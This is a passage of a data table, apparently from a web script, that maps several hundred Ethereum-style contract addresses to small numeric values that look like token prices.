                "0xeca82185adce47f39c684352b0439f030f860318": 140827e-10,
                "0xe4815ae53b124e7263f08dcdbbb757d41ed658c6": 346469e-10,
                "0xc3761eb917cd790b30dad99f6cc5b4ff93c4f9ea": 60454e-10,
                "0xf25c91c87e0b1fd9b4064af0f427157aab0193a7": 9.123e-7,
                "0xafcdd4f666c84fed1d8bd825aa762e3714f652c9": 0,
                "0x0202be363b8a4820f3f4de7faf5224ff05943ab1": .0002150351,
                "0xa1d6df714f91debf4e0802a542e13067f31b8262": 5065e-9,
                "0x4946fcea7c692606e8908002e55a582af44ac121": 208406e-10,
                "0x0d88ed6e74bbfd96b831231638b66c05571e824f": .0010984576,
                "0xc6dddb5bc6e61e0841c54f3e723ae1f3a807260b": .0126226179,
                "0x2494a68c1484376fef880b4c24d91f049d29b02a": 595246e-10,
                "0xb9ef770b6a5e12e45983c5d80545258aa38f3b78": .0001317856,
                "0xaf1250fa68d7decd34fd75de8742bc03b29bd58e": 553389e-10,
                "0xc314b0e758d5ff74f63e307a86ebfe183c95767b": 60019e-10,
                "0xb4371da53140417cbb3362055374b10d97e420bb": 39492e-10,
                "0xa66daa57432024023db65477ba87d4e7f5f95213": 11731e-10,
                "0x9ab7bb7fdc60f4357ecfef43986818a2a3569c62": .0001285658,
                "0x84c722e6f1363e8d5c6db3ea600bef9a006da824": 309713e-10,
                "0x79c7ef95ad32dcd5ecadb231568bb03df7824815": 8.47e-8,
                "0x2da719db753dfa10a62e140f436e1d67f2ddb0d6": 38271e-10,
                "0xbdab72602e9ad40fc6a6852caf43258113b8f7a5": .0002665918,
                "0xadb2437e6f65682b85f814fbc12fec0508a7b1d0": .1858104712,
                "0x95e40e065afb3059dcabe4aaf404c1f92756603a": .0001109635,
                "0xb9f747162ab1e95d07361f9048bcdf6edda9eea7": 27206e-10,
                "0xcad49c39b72c37b32cee8b14f33f316d3a8bc335": 31156e-10,
                "0x5b71bee9d961b1b848f8485eec8d8787f80217f5": 13592e-10,
                "0x7d5121505149065b562c789a0145ed750e6e8cdd": 73964e-10,
                "0x05fb86775fd5c16290f1e838f5caaa7342bd9a63": 121075e-10,
                "0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6": 164045e-10,
                "0x08389495d7456e1951ddf7c3a1314a4bfb646d8b": 70739e-9,
                "0xa4eed63db85311e22df4473f87ccfc3dadcfa3e3": 525327e-10,
                "0xb9eefc4b0d472a44be93970254df4f4016569d27": 40829e-10,
                "0xc8c424b91d8ce0137bab4b832b7f7d154156ba6c": 156668e-10,
                "0xf418588522d5dd018b425e472991e52ebbeeeeee": 205601e-9,
                "0x40fd72257597aa14c7231a7b1aaa29fce868f677": .0031749174,
                "0x2c9023bbc572ff8dc1228c7858a280046ea8c9e5": 329364e-10,
                "0x33d203fa03bb30b133de0fe2d6533c268ba286b6": 4e-10,
                "0x2781246fe707bb15cee3e5ea354e2154a2877b16": 16428e-10,
                "0xefab7248d36585e2340e5d25f8a8d243e6e3193f": 14914e-10,
                "0xef1344bdf80bef3ff4428d8becec3eea4a2cf574": 34149e-10,
                "0x73c9275c3a2dd84b5741fd59aebf102c91eb033f": .0115832262,
                "0x9469d013805bffb7d3debe5e7839237e535ec483": 4227e-9,
                "0x728f30fa2f100742c7949d1961804fa8e0b1387d": 111804e-10,
                "0x12b19d3e2ccc14da04fae33e63652ce469b3f2fd": .0001304517,
                "0x08c32b0726c5684024ea6e141c50ade9690bbdcc": 251616e-9,
                "0xa00a4d5786a6e955e9539d01d78bf68f3271c050": 8.605e-7,
                "0xedf6568618a00c6f0908bf7758a16f76b6e04af9": .0001892677,
                "0xebd9d99a3982d547c5bb4db7e3b1f9f14b67eb83": 430837e-10,
                "0x9813037ee2218799597d83d4a5b6f3b6778218d9": .0007125606,
                "0x2ba592f78db6436527729929aaf6c908497cb200": .0080635493,
                "0x4e352cf164e64adcbad318c3a1e222e9eba4ce42": .0026186015,
                "0x37fe0f067fa808ffbdd12891c0858532cfe7361d": 158262e-10,
                "0xe5a3229ccb22b6484594973a03a3851dcd948756": 766128e-9,
                "0x3dd98c8a089dbcff7e8fc8d4f532bd493501ab7f": 172094e-10,
                "0x3d3d35bb9bec23b06ca00fe472b50e7a4c692c30": .0001136761,
                "0x3c9d6c1c73b31c837832c72e04d3152f051fc1a9": .0326161857,
                "0x32a7c02e79c4ea1008dd6564b35f131428673c41": .0005022689,
                "0xd9c2d319cd7e6177336b0a9c93c21cb48d84fb54": .0065307065,
                "0x3b58c52c03ca5eb619eba171091c86c34d603e5f": 34861e-10,
                "0x77777feddddffc19ff86db637967013e6c6a116c": .0041382691,
                "0xd433138d12beb9929ff6fd583dc83663eea6aaa5": 345976e-10,
                "0x419c4db4b9e25d6db2ad9691ccb832c8d9fda05e": 119817e-10,
                "0xe0b7927c4af23765cb51314a0e0521a9645f0e2a": .0598395687,
                "0x686c650dbcfeaa75d09b883621ad810f5952bd5d": 589052e-9,
                "0xbdbc2a5b32f3a5141acd18c39883066e4dab9774": .0001605884,
                "0xfb559ce67ff522ec0b9ba7f5dc9dc7ef6c139803": 103941e-9,
                "0xdf49c9f599a0a9049d97cff34d0c30e468987389": 13291e-10,
                "0x1e2f15302b90edde696593607b6bd444b64e8f02": 0,
                "0x03be5c903c727ee2c8c4e9bc0acc860cca4715e2": 64983e-10,
                "0xa130e3a33a4d84b04c3918c4e5762223ae252f80": 99336e-10,
                "0x2b915b505c017abb1547aa5ab355fbe69865cc6d": 920074e-10,
                "0x95aa5d2dbd3c16ee3fdea82d5c6ec3e38ce3314f": 137325e-10,
                "0xdfbc9050f5b01df53512dcc39b4f2b2bbacd517a": 4.198e-7,
                "0xcf3c8be2e2c42331da80ef210e9b1b307c03d36a": 6.107e-7,
                "0xc28e931814725bbeb9e670676fabbcb694fe7df2": 99225e-10,
                "0x41d5d79431a913c4ae7d69a668ecdfe5ff9dfb68": .0439672607,
                "0x8d2bffcbb19ff14a698c424fbcdcfd17aab9b905": 164548e-10,
                "0x26c8afbbfe1ebaca03c2bb082e69d0476bffe099": .0001438234,
                "0xb7e77aebbe0687d2eff24cc90c41a3b6ea74bdab": 47801e-10,
                "0x01ff50f8b7f74e4f00580d9596cd3d0d6d6e326f": 55542e-10,
                "0xeb953eda0dc65e3246f43dc8fa13f35623bdd5ed": 80152e-10,
                "0x48783486ddd7fa85eca6b0c4ae8920bc25dfbcd7": 40603e-10,
                "0x1fe24f25b1cf609b9c4e7e12d802e3640dfa5e43": 632689e-10,
                "0xd478161c952357f05f0292b56012cd8457f1cfbf": 43823e-9,
                "0x946551dd05c5abd7cc808927480225ce36d8c475": 4.042e-7,
                "0x275f5ad03be0fa221b4c6649b8aee09a42d9412a": .365413089,
                "0xaaef88cea01475125522e117bfe45cf32044e238": 897529e-10,
                "0x72b886d09c117654ab7da13a14d603001de0b777": 678912e-10,
                "0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c": 308687e-10,
                "0xdacd69347de42babfaecd09dc88958378780fb62": 25441e-10,
                "0x549020a9cb845220d66d3e9c6d9f9ef61c981102": 11917e-10,
                "0x4cf89ca06ad997bc732dc876ed2a7f26a9e7f361": .0001829551,
                "0x0bb217e40f8a5cb79adf04e1aab60e5abd0dfc1e": 9.151e-7,
                "0xee573a945b01b788b9287ce062a0cfc15be9fd86": 423387e-10,
                "0xd47bdf574b4f76210ed503e0efe81b58aa061f3d": 298277e-10,
                "0x72955ecff76e48f2c8abcce11d54e5734d6f3657": 48562e-10,
                "0xd31695a1d35e489252ce57b129fd4b1b05e6acac": .0001220069,
                "0x396ec402b42066864c406d1ac3bc86b575003ed8": 105029e-10,
                "0xaad483f97f13c6a20b9d05d07c397ce85c42c393": 221889e-10,
                "0xf293d23bf2cdc05411ca0eddd588eb1977e8dcd4": 14145e-10,
                "0x67b6d479c7bb412c54e03dca8e1bc6740ce6b99c": 126979e-10,
                "0x69a95185ee2a045cdc4bcd1b1df10710395e4e23": .0009041436,
                "0x7c5a0ce9267ed19b22f8cae653f198e3e8daf098": 529627e-10,
                "0xca1207647ff814039530d7d35df0e1dd2e91fa84": 968798e-10,
                "0x970b9bb2c0444f5e81e9d0efb84c8ccdcdcaf84d": 606524e-10,
                "0x9c354503c38481a7a7a51629142963f98ecc12d0": 38781e-10,
                "0x8b39b70e39aa811b69365398e0aace9bee238aeb": 793852e-10,
                "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": 74807e-9,
                "0x62959c699a52ec647622c91e79ce73344e4099f5": 588523e-10,
                "0x2162f572b25f7358db9376ab58a947a4e45cede1": 38686e-10,
                "0xaf4dce16da2877f8c9e00544c93b62ac40631f16": 80589e-10,
                "0xeeaa40b28a2d1b0b08f6f97bb1dd4b75316c6107": .0001952036,
                "0x0b15ddf19d47e6a86a56148fb4afffc6929bcb89": 713885e-10,
                "0x4da0c48376c277cdbd7fc6fdc6936dee3e4adf75": 55383e-10,
                "0xbd356a39bff2cada8e9248532dd879147221cf76": 301071e-10,
                "0xd9016a907dc0ecfa3ca425ab20b6b785b42f2373": 84855e-10,
                "0x1fc5ef0337aea85c5f9198853a6e3a579a7a6987": 102893e-10,
                "0x544c42fbb96b39b21df61cf322b5edc285ee7429": 694256e-10,
                "0x9ac5c63ddcb93612e316ab31dfc8192bc8961988": 192017e-10,
                "0x557b933a7c2c45672b610f8954a3deb39a51a8ca": 110048e-10,
                "0x16484d73ac08d2355f466d448d2b79d2039f6ebb": 202339e-10,
                "0xdd16ec0f66e54d453e6756713e533355989040e4": 150778e-10,
                "0x298d492e8c1d909d3f63bc4a36c66c64acb3d695": 459747e-10,
                "0xcd1faff6e578fa5cac469d2418c95671ba1a62fe": 176097e-10,
                "0xad22f63404f7305e4713ccbd4f296f34770513f4": .0002795366,
                "0x297e4e5e59ad72b1b0a2fd446929e76117be0e0a": .0001478534,
                "0xc03a652efbbacfabde37cd66c7a4ff4332f7186c": 79356e-10,
                "0xf8ad7dfe656188a23e89da09506adf7ad9290d5d": 51781e-10,
                "0xc07a150ecadf2cc352f5586396e344a6b17625eb": 16701e-10,
                "0xf2ddae89449b7d26309a5d54614b1fc99c608af5": 13926e-10,
                "0xee9801669c6138e84bd50deb500827b776777d28": 56817e-9,
                "0x2be5e8c109e2197d077d13a82daead6a9b3433c5": .0010712895,
                "0x038a68ff68c393373ec894015816e33ad41bd564": 3587e-8,
                "0xd5d86fc8d5c0ea1ac1ac5dfab6e529c9967a45e9": 4576e-9,
                "0x3c6a7ab47b5f058be0e7c7fe1a4b7925b8aca40e": .0020886624,
                "0xb753428af26e81097e7fd17f40c88aaa3e04902c": .0305514498,
                "0xa487bf43cf3b10dffc97a9a744cbb7036965d3b9": 171079e-10,
                "0x6d614686550b9e1c1df4b2cd8f91c9d4df66c810": 5939e-9,
                "0xa3bed4e1c75d00fa6f4e5e6922db7261b5e9acd2": 488452e-10,
                "0x37fc4b48ce93469dbea9918468993c735049642a": 368654e-10,
                "0xfb19075d77a0f111796fb259819830f4780f1429": .001243761,
                "0x7778360f035c589fce2f4ea5786cbd8b36e5396b": 160397e-10,
                "0x4156d3342d5c385a87d264f90653733592000581": 332688e-10,
                "0x1796ae0b0fa4862485106a0de9b654efe301d0b2": .0007818235,
                "0xf0c5831ec3da15f3696b4dad8b21c7ce2f007f28": 83081e-10,
                "0x255aa6df07540cb5d3d297f0d0d4d84cb52bc8e6": 395103e-10,
                "0x961c8c0b1aad0c0b10a51fef6a867e3091bcef17": .0001105084,
                "0x56a86d648c435dc707c8405b78e2ae8eb4e60ba4": 63229e-10,
                "0x73374ea518de7addd4c2b624c0e8b113955ee041": 258927e-10,
                "0x3af33bef05c2dcb3c7288b77fe1c8d2aeba4d789": 323111e-10,
                "0x954b890704693af242613edef1b603825afcd708": 10878e-10,
                "0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a": 47619e-9,
                "0x3affcca64c2a6f4e3b6bd9c64cd2c969efd1ecbe": 4.601e-7,
                "0x5d929aa919e489505ccaad8a199619c6dca0c2de": 4.354e-7,
                "0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23": 677125e-10,
                "0x374cb8c27130e2c9e04f44303f3c8351b9de61c1": 74e-9,
                "0x6beb418fc6e1958204ac8baddcf109b8e9694966": 21946e-9,
                "0xee7527841a932d2912224e20a405e1a1ff747084": 4.219e-7,
                "0xf5238462e7235c7b62811567e63dd17d12c2eaa0": .0347878543,
                "0xa01199c61841fce3b3dafb83fefc1899715c8756": 718214e-10,
                "0xf4134146af2d511dd5ea8cdb1c4ac88c57d60404": 198143e-10,
                "0xaac41ec512808d64625576eddd580e7ea40ef8b2": 218465e-9,
                "0xcfeb09c3c5f0f78ad72166d55f9e6e9a60e96eec": 13967e-9,
                "0x738865301a9b7dd80dc3666dd48cf034ec42bdda": .0001335797,
                "0x0e8d6b471e332f140e7d9dbb99e5e3822f728da6": 105147e-10,
                "0x7de91b204c1c737bcee6f000aaa6569cf7061cb7": .0025475381,
                "0x6b9f031d718dded0d681c20cb754f97b3bb81b78": 84548e-9,
                "0x84342e932797fc62814189f01f0fb05f52519708": 2.954e-7,
                "0x6243d8cea23066d098a15582d81a598b4e8391f4": .012136637,
                "0xb2617246d0c6c0087f18703d576831899ca94f01": 55211e-10,
                "0xada86b1b313d1d5267e3fc0bb303f0a2b66d0ea7": 138471e-9,
                "0xb97048628db6b661d4c2aa833e95dbe1a905b280": 112674e-10,
                "0xea1ea0972fa092dd463f2968f9bb51cc4c981d71": .0001483097,
                "0xb6ca7399b4f9ca56fc27cbff44f4d2e4eef1fc81": .0044747576,
                "0x9695e0114e12c0d3a3636fab5a18e6b737529023": 144561e-10,
                "0x97872eafd79940c7b24f7bcc1eadb1457347adc9": .0005485591,
                "0xae697f994fc5ebc000f8e22ebffee04612f98a0d": 1.779e-7,
                "0xf001937650bb4f62b57521824b2c20f5b91bea05": 8.194e-7,
                "0xb4d930279552397bba2ee473229f89ec245bc365": .0007226702,
                "0xed0d5747a9ab03a75fbfec3228cd55848245b75d": .0001119396,
                "0xe4cfe9eaa8cdb0942a80b7bc68fd8ab0f6d44903": 185399e-10,
                "0x4086e77c5e993fdb90a406285d00111a974f877a": 22009e-10,
                "0x24ec2ca132abf8f6f8a6e24a1b97943e31f256a7": 44125e-10,
                "0x1b40183efb4dd766f11bda7a7c3ad8982e998421": .0002427366,
                "0x0aacfbec6a24756c20d41914f2caba817c0d8521": .0001320647,
                "0x1c9922314ed1415c95b9fd453c3818fd41867d0b": 33128e-10,
                "0x473037de59cf9484632f4a27b509cfe8d4a31404": 608054e-10,
                "0xc719d010b63e5bbf2c0551872cd5316ed26acd83": 88748e-10,
                "0x5319e86f0e41a06e49eb37046b8c11d78bcad68c": 292359e-10,
                "0x4a527d8fc13c5203ab24ba0944f4cb14658d1db6": 40235e-10,
                "0x01e0e2e61f554ecaaec0cc933e739ad90f24a86d": .0005816423,
                "0x188e817b02e635d482ae4d81e25dda98a97c4a42": 6.715e-7,
                "0xdc8af07a7861bedd104b8093ae3e9376fc8596d2": 320688e-10,
                "0xb4272071ecadd69d933adcd19ca99fe80664fc08": .0006545112,
                "0xa31b1767e09f842ecfd4bc471fe44f830e3891aa": 4.941e-7,
                "0x06a01a4d579479dd5d884ebf61a31727a3d8d442": 111381e-10,
                "0xaf80951201a0eff85a0fd3adf4c7043db856d3e6": 142639e-10,
                "0x80d55c03180349fff4a229102f62328220a96444": 459017e-10,
                "0x30d20208d987713f46dfd34ef128bb16c404d10f": .0001960458,
                "0xdf290b162a7d3e0a328cf198308d421954f08b94": 119258e-10,
                "0x3e7804c51a70ba26e904c2e0ab440c5623a8a83f": .0002508956,
                "0x4824a7b64e3966b0133f4f4ffb1b9d6beb75fff7": 19657e-10,
                "0xb1e93236ab6073fdac58ada5564897177d4bcc43": 27868e-10,
                "0x0488401c3f535193fa8df029d9ffe615a06e74e6": 2.196e-7,
                "0x056354f3ff20743aa4c0da365603871c7000b081": 3.794e-7,
                "0xb9d99c33ea2d86ec5ec6b8a4dd816ebba64404af": .0001241043,
                "0x9b99cca871be05119b2012fd4474731dd653febe": 614437e-10,
                "0xc45dbdf28844fdb1482c502897d433ac08d6ccd0": .0001006911,
                "0xaaaf91d9b90df800df4f55c205fd6989c977e73a": 547898e-10,
                "0x3ebb4a4e91ad83be51f8d596533818b246f4bee1": 263159e-10,
                "0xf7920b0768ecb20a123fac32311d07d193381d6f": 4.594e-7,
                "0x3fd8f39a962efda04956981c31ab89fab5fb8bc8": .0005072683,
                "0xf920e4f3fbef5b3ad0a25017514b769bdc4ac135": 37e-9,
                "0xabe580e7ee158da464b51ee1a83ac0289622e6be": .0003026941,
                "0x7865af71cf0b288b4e7f654f4f7851eb46a2b7f8": 5.011e-7,
                "0x69d9905b2e5f6f5433212b7f3c954433f23c1572": .0001591838,
                "0xd3c325848d7c6e29b574cb0789998b2ff901f17e": 131219e-10,
                "0x8971f9fd7196e5cee2c1032b50f656855af7dd26": 1077e-9,
                "0xaa2ce7ae64066175e0b90497ce7d9c190c315db4": 4.538e-7,
                "0x850aab69f0e0171a9a49db8be3e71351c8247df4": 174689e-10,
                "0x429881672b9ae42b8eba0e26cd9c73711b891ca5": .0009149685,
                "0xac3211a5025414af2866ff09c23fc18bc97e79b1": 18175e-10,
                "0x8287c7b963b405b7b8d467db9d79eec40625b13a": 19585e-10,
                "0x84cffa78b2fbbeec8c37391d2b12a04d2030845e": 618846e-10,
                "0xeb9a4b185816c354db92db09cc3b50be60b901b6": 57605e-10,
                "0xce16a802725438af9b4dcac00e7791e3d890e3b4": 34868e-10,
                "0xfd6c31bb6f05fc8db64f4b740ab758605c271fd8": 343364e-10,
                "0x14da230d6726c50f759bc1838717f8ce6373509c": 7.691e-7,
                "0x0d02755a5700414b26ff040e1de35d337df56218": 43789e-10,
                "0xd5930c307d7395ff807f2921f12c5eb82131a789": 16787e-10,
                "0xcafe001067cdef266afb7eb5a286dcfd277f3de5": 227221e-10,
                "0x23894dc9da6c94ecb439911caf7d337746575a72": 23524e-10,
                "0xacfa209fb73bf3dd5bbfb1101b9bc999c49062a5": 42696e-9,
                "0x2edf094db69d6dcd487f1b3db9febe2eec0dd4c5": 25911e-9,
                "0x63f88a2298a5c4aee3c216aa6d926b184a4b2437": 89352e-10,
                "0x6710c63432a2de02954fc0f851db07146a6c0312": 43223e-10,
                "0x37f04d2c3ae075fad5483bb918491f656b12bdb6": 4.075e-7,
                "0x7697b462a7c4ff5f8b55bdbc2f4076c2af9cf51a": .0001025204,
                "0xb1f66997a5760428d3a87d68b90bfe0ae64121cc": 85534e-10,
                "0xe5caef4af8780e59df925470b050fb23c43ca68c": 238809e-10,
                "0xb1f871ae9462f1b2c6826e88a7827e76f86751d4": 81508e-10,
                "0xa0f0546eb5e3ee7e8cfc5da12e5949f3ae622675": 32004e-10,
                "0x9ab165d795019b6d8b3e971dda91071421305e5a": 1.555e-7,
                "0xed0439eacf4c4965ae4613d77a5c2efe10e5f183": 300675e-10,
                "0x47b9f01b16e9c9cb99191dca68c9cc5bf6403957": 15511e-9,
                "0x2f141ce366a2462f02cea3d12cf93e4dca49e4fd": 2e-10,
                "0x46e98ffe40e408ba6412beb670507e083c8b95ff": 106317e-10,
                "0x5218e472cfcfe0b64a064f055b43b4cdc9efd3a6": 33824e-10,
                "0xd5525d397898e5502075ea5e830d8914f6f0affe": .0529173278,
                "0x57c75eccc8557136d32619a191fbcdc88560d711": 1.419e-7,
                "0x4f3afec4e5a3f2a6a1a411def7d7dfe50ee057bf": .0269001849,
                "0xc9fe6e1c76210be83dc1b5b20ec7fd010b0b1d15": 22221e-10,
                "0x6ec8a24cabdc339a06a172f8223ea557055adaa5": 223e-8,
                "0xf8e9f10c22840b613cda05a0c5fdb59a4d6cd7ef": 7467e-9,
                "0x50de6856358cc35f3a9a57eaaa34bd4cb707d2cd": 43652e-10,
                "0x8564653879a18c560e7c0ea0e084c516c62f5653": 33162e-10,
                "0xfbeea1c75e4c4465cb2fccc9c6d6afe984558e20": .0013627608,
                "0x6e5970dbd6fc7eb1f29c6d2edf2bc4c36124c0c1": 830379e-10,
                "0x2d0e95bd4795d7ace0da3c0ff7b706a5970eb9d3": 9.399e-7,
                "0xc8807f0f5ba3fa45ffbdc66928d71c5289249014": 5.103e-7,
                "0xb8baa0e4287890a5f79863ab62b7f175cecbd433": 800922e-10,
                "0x86ed939b500e121c0c5f493f399084db596dad20": 45199e-10,
                "0x798d1be841a82a273720ce31c822c61a67a601c3": 2.4083254873,
                "0xfc979087305a826c2b2a0056cfaba50aad3e6439": 2276e-9,
                "0x55f93985431fc9304077687a35a1ba103dc1e081": 10209e-10,
                "0xaffcdd96531bcd66faed95fc61e443d08f79efef": 1.1141140458,
                "0x08d32b0da63e2c3bcf8019c9c5d849d7a9d791e6": 2.3e-9,
                "0x2791bfd60d232150bff86b39b7146c0eaaa2ba81": 5464e-9,
                "0x0cdf9acd87e940837ff21bb40c9fd55f68bba059": 125517e-10,
                "0x06f3c323f0238c72bf35011071f2b5b7f43a054c": 509423e-10,
                "0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6": 25357e-10,
                "0x4ee438be38f8682abb089f2bfea48851c5e71eaf": 196604e-10,
                "0xd502f487e1841fdc805130e13eae80c61186bc98": 112482e-10,
                "0xcd7492db29e2ab436e819b249452ee1bbdf52214": 1.2e-9,
                "0x107c4504cd79c5d2696ea0030a8dd4e92601b82e": 214915e-10,
                "0x1614f18fc94f47967a3fbe5ffcd46d4e7da3d787": 146141e-10,
                "0xe7ae6d0c56cacaf007b7e4d312f9af686a9e9a04": 12113e-10,
                "0xd82df0abd3f51425eb15ef7580fda55727875f14": 17388e-10,
                "0xc690f7c7fcffa6a82b79fab7508c466fefdfc8c5": 14538e-10,
                "0xa0cf46eb152656c7090e769916eb44a138aaa406": 94383e-10,
                "0xc55c2175e90a46602fd42e931f62b3acc1a013ca": 38019e-10,
                "0x2e95cea14dd384429eb3c4331b776c4cfbb6fcd9": 297e-8,
                "0x2f75113b13d136f861d212fa9b572f2c79ac81c4": 7633e-8,
                "0xb6ed7644c69416d67b522e20bc294a9a9b405b31": 118892e-9,
                "0x765f0c16d1ddc279295c1a7c24b0883f62d33f75": 136372e-10,
                "0x8e0fe2947752be0d5acf73aae77362daf79cb379": 349999e-10,
                "0x43a96962254855f16b925556f9e97be436a43448": 130952e-10,
                "0x83869de76b9ad8125e22b857f519f001588c0f62": 106264e-10,
                "0x905e337c6c8645263d3521205aa37bf4d034e745": 14585e-10,
                "0x875773784af8135ea0ef43b5a374aad105c5d39e": .0001742198,
                "0x42726d074bba68ccc15200442b72afa2d495a783": .0002124836,
                "0x965697b4ef02f0de01384d0d4f9f782b1670c163": 297656e-10,
                "0x92ec47df1aa167806dfa4916d9cfb99da6953b8f": 12378e-10,
                "0x70d2b7c19352bb76e4409858ff5746e500f2b67c": 43557e-10,
                "0x9d0b65a76274645b29e4cc41b8f23081fa09f4a3": 44753e-10,
                "0x6d0f5149c502faf215c89ab306ec3e50b15e2892": 22927e-10,
                "0x0db8d8b76bc361bacbb72e2c491e06085a97ab31": .0001957375,
                "0x0ff6ffcfda92c53f615a4a75d982f399c989366b": 415559e-10,
                "0x50bc2ecc0bfdf5666640048038c1aba7b7525683": 1.385e-7,
                "0x35b08722aa26be119c1608029ccbc976ac5c1082": 7.251e-7,
                "0x8e1b448ec7adfc7fa35fc2e885678bd323176e34": 2.479e-7,
                "0x77777777772cf0455fb38ee0e75f38034dfa50de": .0001139349,
                "0xac0104cca91d167873b8601d2e71eb3d4d8c33e0": .0002840251,
                "0x34be5b8c30ee4fde069dc878989686abe9884470": 281182e-10,
                "0x1ab43204a195a0fd37edec621482afd3792ef90b": 6.944e-7,
                "0x491e136ff7ff03e6ab097e54734697bb5802fc1c": .0003356295,
                "0x30f271c9e86d2b7d00a6376cd96a1cfbd5f0b9b3": 90046e-10,
                "0x0ada190c81b814548ddc2f6adc4a689ce7c1fe73": .0010505721,
                "0xc56c2b7e71b54d38aab6d52e94a04cbfa8f604fa": 6645e-7,
                "0x8db253a1943dddf1af9bcf8706ac9a0ce939d922": 8.518e-7,
                "0x6e9730ecffbed43fd876a264c982e254ef05a0de": .0001415566,
                "0x89fb927240750c1b15d4743cd58440fc5f14a11c": 21518e-10,
                "0x2ba8349123de45e931a8c8264c332e6e9cf593f9": 6489e-9,
                "0x9ac59862934ebc36072d4d8ada37c62373a13856": 0,
                "0x009c43b42aefac590c719e971020575974122803": 111342e-10,
                "0x9b917d94fb0138edf520332f3d45494f1a74bec8": 3771e-9,
                "0xe469c4473af82217b30cf17b10bcdb6c8c796e75": 1.01e-8,
                "0xbe428c3867f05dea2a89fc76a102b544eac7f772": 8.832e-7,
                "0x0e5c8c387c5eba2ecbc137ad012aed5fe729e251": .0009596761,
                "0x26db5439f651caf491a87d48799da81f191bdb6b": 5914e-9,
                "0xe477292f1b3268687a29376116b0ed27a9c76170": 36937e-10,
                "0xdcd85914b8ae28c1e62f1c488e1d968d5aaffe2b": 1.653e-7,
                "0x24e89bdf2f65326b94e36978a7edeac63623dafa": 1.4e-9,
                "0xda0c94c73d127ee191955fb46bacd7ff999b2bcd": .0001847977,
                "0x72f020f8f3e8fd9382705723cd26380f8d0c66bb": 135648e-10,
                "0x9d5686eadea7327f5a0c4820dca90457a0e88763": 3.896e-7,
                "0x9fb83c0635de2e815fd1c21b3a292277540c2e8d": 5.482e-7,
                "0x26e75307fc0c021472feb8f727839531f112f317": 221042e-10,
                "0xdb0170e2d0c1cc1b2e7a90313d9b9afa4f250289": 75867e-10,
                "0x4df812f6064def1e5e029f1ca858777cc98d2d81": 124979e-10,
                "0xc48b4814faed1ccc885dd6fde62a6474aecbb19a": 1.967e-7,
                "0x13119e34e140097a507b07a5564bde1bc375d9e6": 7.81e-8,
                "0xb8e2e2101ed11e9138803cd3e06e16dd19910647": 31822e-10,
                "0xb37a769b37224449d92aac57de379e1267cd3b00": 3.505e-7,
                "0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6": 132184e-10,
                "0xe3818504c1b32bf1557b16c238b2e01fd3149c17": 33497e-10,
                "0xe1d7c7a4596b038ced2a84bf65b8647271c53208": 33701e-10,
                "0x72e9d9038ce484ee986fea183f8d8df93f9ada13": .0006318838,
                "0xf4b5470523ccd314c6b9da041076e7d79e0df267": 105263e-10,
                "0x9af839687f6c94542ac5ece2e317daae355493a1": 12041e-10,
                "0x4057db5bd9f67a566aa10e5587b1a964affc6a16": 2.304e-7,
                "0x1559fa1b8f28238fd5d76d9f434ad86fd20d1559": 634872e-10,
                "0x69e5c11a7c30f0bf84a9faecbd5161aa7a94deca": 1.39e-8,
                "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50": 5.045e-7,
                "0x1da87b114f35e1dc91f72bf57fc07a768ad40bb0": 223725e-10,
                "0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25": 16961e-10,
                "0x7240ac91f01233baaf8b064248e80feaa5912ba3": .0010398751,
                "0x03d1e72765545729a035e909edd9371a405f77fb": 4.3e-9,
                "0x0c9c7712c83b3c70e7c5e11100d33d9401bdf9dd": 19163e-10,
                "0xb6adb74efb5801160ff749b1985fd3bd5000e938": 128168e-10,
                "0x92cfbec26c206c90aee3b7c66a9ae673754fab7e": 124025e-10,
                "0xb6ff96b8a8d214544ca0dbc9b33f7ad6503efd32": 69512e-10,
                "0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13": 453e-9,
                "0xfe5f141bf94fe84bc28ded0ab966c16b17490657": 8.107e-7,
                "0x6c936d4ae98e6d2172db18c16c4b601c99918ee6": 3.038e-7,
                "0xb3e2cb7cccfe139f8ff84013823bf22da6b6390a": 811076e-10,
                "0xfe459828c90c0ba4bc8b42f5c5d44f316700b430": 120741e-10,
                "0x9f7229af0c4b9740e207ea283b9094983f78ba04": .0013166893,
                "0x4297394c20800e8a38a619a243e9bbe7681ff24e": 69731e-10,
                "0x01b23286ff60a543ec29366ae8d6b6274ca20541": 1.793e-7,
                "0xdaf88906ac1de12ba2b1d2f7bfc94e9638ac40c4": 59717e-10,
                "0x4463e6a3ded0dbe3f6e15bc8420dfc55e5fea830": .0002993664,
                "0xec5483804e637d45cde22fa0869656b64b5ab1ab": 62452e-10,
                "0xe7976c4efc60d9f4c200cc1bcef1a1e3b02c73e7": .0001892949,
                "0x8b3870df408ff4d7c3a26df852d41034eda11d81": 830566e-10,
                "0x5f0e628b693018f639d10e4a4f59bd4d8b2b6b44": .0839811106,
                "0x10086399dd8c1e3de736724af52587a2044c9fa2": 8.36e-8,
                "0x0b4bdc478791897274652dc15ef5c135cae61e60": 20989e-10,
                "0xf3dcbc6d72a4e1892f7917b7c43b74131df8480e": 152393e-10,
                "0x725c263e32c72ddc3a19bea12c5a0479a81ee688": 113948e-10,
                "0x9ed8e7c9604790f7ec589f99b94361d8aab64e5e": 34132e-10,
                "0xad996a45fd2373ed0b10efa4a8ecb9de445a4302": 42256e-10,
                "0x0aee8703d34dd9ae107386d3eff22ae75dd616d1": 362539e-10,
                "0x93c9175e26f57d2888c7df8b470c9eea5c0b0a93": 617899e-10,
                "0x9b20dabcec77f6289113e61893f7beefaeb1990a": 7.517e-7,
                "0xffffffff2ba8f66d4e51811c5190992176930278": 202327e-10,
                "0xc86817249634ac209bc73fca1712bbd75e37407d": 126094e-10,
                "0x217ddead61a42369a266f1fb754eb5d3ebadc88a": 95123e-10,
                "0x7e291890b01e5181f7ecc98d79ffbe12ad23df9e": .0004103695,
                "0xca0e7269600d353f70b14ad118a49575455c0f2f": 1801e-9,
                "0xa23c1194d421f252b4e6d5edcc3205f7650a4ebe": 11292e-10,
                "0xd4c435f5b09f855c3317c8524cb1f586e42795fa": 3.474e-7,
